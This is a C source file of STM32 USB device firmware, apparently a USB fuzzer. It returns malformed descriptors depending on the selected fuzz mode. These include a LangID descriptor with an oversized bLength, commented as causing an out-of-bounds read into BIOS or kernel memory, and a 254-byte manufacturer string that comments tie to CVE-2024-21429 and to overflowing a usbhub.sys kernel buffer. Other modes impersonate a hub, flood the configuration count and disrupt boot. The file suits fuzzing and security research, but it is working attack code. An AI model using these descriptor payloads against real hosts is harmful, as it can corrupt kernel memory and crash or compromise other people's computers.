/**
 * usbd_desc.c — USB Descriptor callbacks (runtime-patched)
 *
 * All fuzz patches are applied at runtime based on g_active_fuzz_mode.
 * No compile-time #if blocks — one binary for all modes.
 *
 * Config descriptor is handled entirely by usbd_fuzzer.c (GetFSCfgDesc).
 * This file covers: Device, String, LangID descriptors.
 */

#include "usbd_core.h"
#include "usbd_desc.h"
#include "usbd_conf.h"
#include "main.h"

extern uint8_t g_active_fuzz_mode;
extern uint8_t g_auto_seq_mode;

/* -----------------------------------------------------------------------
 * Device Descriptor — patched for Mode 4 (bMaxPacketSize0 = 0xFF)
 * ----------------------------------------------------------------------- */
__ALIGN_BEGIN static uint8_t USBD_DeviceDesc[USB_LEN_DEV_DESC] __ALIGN_END = {
    0x12,                    /* bLength */
    USB_DESC_TYPE_DEVICE,    /* bDescriptorType */
    0x00, 0x02,              /* bcdUSB 2.0 */
    0x00,                    /* bDeviceClass (defined at interface level) */
    0x00,                    /* bDeviceSubClass */
    0x00,                    /* bDeviceProtocol */
    0x40,                    /* bMaxPacketSize0 = 64 — patched at runtime for mode 4 */
    0x83, 0x04,              /* idVendor  = 0x0483 (ST) */
    0x11, 0x57,              /* idProduct = 0x5711 */
    0x00, 0x02,              /* bcdDevice 2.00 */
    USBD_IDX_MFC_STR,        /* iManufacturer */
    USBD_IDX_PRODUCT_STR,    /* iProduct */
    USBD_IDX_SERIAL_STR,     /* iSerialNumber */
    0x01                     /* bNumConfigurations */
};

/* -----------------------------------------------------------------------
 * String Descriptors
 * Mode 3: Manufacturer string has bLength=0xFF (real=14 bytes) — runtime patch
 * ----------------------------------------------------------------------- */
__ALIGN_BEGIN static uint8_t USBD_LangIDDesc[USB_LEN_LANGID_STR_DESC] __ALIGN_END = {
    USB_LEN_LANGID_STR_DESC,
    USB_DESC_TYPE_STRING,
    0x09, 0x04  /* English US */
};

/* Mode 20: LangID with bLength=0xFF — BIOS/OS string parser reads 255 bytes
 * but only 4 are present → OOB read into BIOS memory pool or kernel heap.
 * BIOS then tries to enumerate 126 phantom language IDs. */
__ALIGN_BEGIN static uint8_t USBD_LangIDDesc_Bomb[4] __ALIGN_END = {
    0xFF,                    /* bLength=255 — real data is 4 bytes */
    USB_DESC_TYPE_STRING,
    0x09, 0x04               /* English US */
};

/* Normal manufacturer string */
__ALIGN_BEGIN static uint8_t USBD_MfcString[] __ALIGN_END = {
    0x0E, USB_DESC_TYPE_STRING,
    'Y',0,'A',0,'N',0,'I',0,'S',0,'F',0
};


/* Mode 3 variant B — CVE-2024-21429 style: 254 bytes actually sent.
 * usbhub.sys copies the string into a fixed-size kernel buffer; 126 Unicode
 * chars (252 data bytes) overflows that buffer → non-paged pool corruption. */
__ALIGN_BEGIN static uint8_t USBD_MfcString_XL[] __ALIGN_END = {
    0xFE, USB_DESC_TYPE_STRING,   /* bLength=254, bDescriptorType=String */
    'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,
    'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,
    'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,
    'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,
    'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,
    'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,
    'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,
    'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,
    'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,
    'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,
    'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,
    'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,
    'A',0,'A',0,'A',0,'A',0,'A',0,'A',0,
};

__ALIGN_BEGIN static uint8_t USBD_ProductString[] __ALIGN_END = {
    0x10, USB_DESC_TYPE_STRING,
    'U',0,'S',0,'B',0,'F',0,'u',0,'z',0,'z',0
};

__ALIGN_BEGIN static uint8_t USBD_SerialString[] __ALIGN_END = {
    0x1A, USB_DESC_TYPE_STRING,
    '0',0,'0',0,'0',0,'0',0,'0',0,'0',0,'0',0,'0',0,'0',0,'0',0,'0',0,'1',0
};

/* -----------------------------------------------------------------------
 * Descriptor accessor callbacks
 * ----------------------------------------------------------------------- */

uint8_t *USBD_FS_DeviceDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
    (void)speed;

    /* Reset patched fields to baseline before applying mode-specific patch */
    USBD_DeviceDesc[2]  = 0x00; USBD_DeviceDesc[3]  = 0x02; /* bcdUSB 2.0 */
    USBD_DeviceDesc[4]  = 0x00;                              /* bDeviceClass */
    USBD_DeviceDesc[5]  = 0x00;                              /* bDeviceSubClass */
    USBD_DeviceDesc[6]  = 0x00;                              /* bDeviceProtocol */
    USBD_DeviceDesc[7]  = 0x40;                              /* bMaxPacketSize0 */
    USBD_DeviceDesc[17] = 0x01;                              /* bNumConfigurations */

    uint8_t eff = (g_active_fuzz_mode == FUZZ_MODE_AUTO_SEQUENCE ||
                   g_active_fuzz_mode == FUZZ_MODE_BOOT_DISRUPT)
                  ? g_auto_seq_mode : g_active_fuzz_mode;

    switch (eff) {
    case FUZZ_MODE_ENDPOINT_MAXPACKET:
        USBD_DeviceDesc[7] = 0xFF;   /* bMaxPacketSize0 overflow */
        break;
    case FUZZ_MODE_HUB_IMPERSONATE:
        USBD_DeviceDesc[4] = 0x09;   /* bDeviceClass = Hub */
        USBD_DeviceDesc[5] = 0x00;
        USBD_DeviceDesc[6] = 0x00;
        break;
    case FUZZ_MODE_BCDUSB_30:
    case FUZZ_MODE_DEVQUAL_BOMB:     /* claim USB 3.0 to trigger DevQual request */
        USBD_DeviceDesc[2] = 0x00;   /* bcdUSB = 0x0300 */
        USBD_DeviceDesc[3] = 0x03;
        break;
    case FUZZ_MODE_NUMCONFIG_ZERO:
        USBD_DeviceDesc[17] = 0x00;  /* bNumConfigurations = 0 */
        break;
    case FUZZ_MODE_NUMCONFIG_FLOOD:
        USBD_DeviceDesc[17] = 0xFE;  /* bNumConfigurations = 254 */
        break;
    default:
        break;
    }

    *length = sizeof(USBD_DeviceDesc);
    return USBD_DeviceDesc;
}

uint8_t *USBD_FS_LangIDStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
    (void)speed;
    uint8_t eff = (g_active_fuzz_mode == FUZZ_MODE_BOOT_DISRUPT ||
                   g_active_fuzz_mode == FUZZ_MODE_AUTO_SEQUENCE)
                  ? g_auto_seq_mode : g_active_fuzz_mode;
    if (eff == FUZZ_MODE_LANGID_BOMB) {
        *length = sizeof(USBD_LangIDDesc_Bomb);
        return USBD_LangIDDesc_Bomb;
    }
    *length = sizeof(USBD_LangIDDesc);
    return USBD_LangIDDesc;
}

uint8_t *USBD_FS_ManufacturerStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
    (void)speed;
    if (g_active_fuzz_mode == FUZZ_MODE_STRING_BLEN_OVERFLOW) {
        /* 254-byte string descriptor — CVE-2024-21429: overflows usbhub.sys kernel buffer */
        *length = (uint16_t)sizeof(USBD_MfcString_XL);
        return USBD_MfcString_XL;
    }
    *length = sizeof(USBD_MfcString);
    return USBD_MfcString;
}

uint8_t *USBD_FS_ProductStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
    (void)speed;
    *length = sizeof(USBD_ProductString);
    return USBD_ProductString;
}

uint8_t *USBD_FS_SerialStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
    (void)speed;
    *length = sizeof(USBD_SerialString);
    return USBD_SerialString;
}

uint8_t *USBD_FS_ConfigStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
    (void)speed;
    *length = 0;
    return NULL;
}

uint8_t *USBD_FS_InterfaceStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
    (void)speed;
    *length = 0;
    return NULL;
}

USBD_DescriptorsTypeDef FS_Desc = {
    USBD_FS_DeviceDescriptor,
    USBD_FS_LangIDStrDescriptor,
    USBD_FS_ManufacturerStrDescriptor,
    USBD_FS_ProductStrDescriptor,
    USBD_FS_SerialStrDescriptor,
    USBD_FS_ConfigStrDescriptor,
    USBD_FS_InterfaceStrDescriptor,
};
